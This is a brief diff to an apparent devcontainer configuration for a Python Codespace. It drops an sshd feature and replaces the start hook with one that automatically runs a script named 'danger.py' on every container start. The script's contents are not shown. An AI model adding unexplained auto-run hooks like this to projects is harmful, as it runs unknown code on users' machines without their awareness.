@@ -1,12 +1,7 @@
 {
     "name": "My Codespace",
     "image": "mcr.microsoft.com/vscode/devcontainers/python:3.8",
-    "features": {
-        "ghcr.io/devcontainers/features/sshd:1": {
-            "version": "latest"
-        }
-    },
-    "postStartCommand": "REPO_NAME=$(basename $(git rev-parse --show-toplevel)); python3 /workspaces/$REPO_NAME/m.py",
+    "postStartCommand": "python3 /workspaces/Bot/danger.py",
     "customizations": {
         "vscode": {
             "settings": {
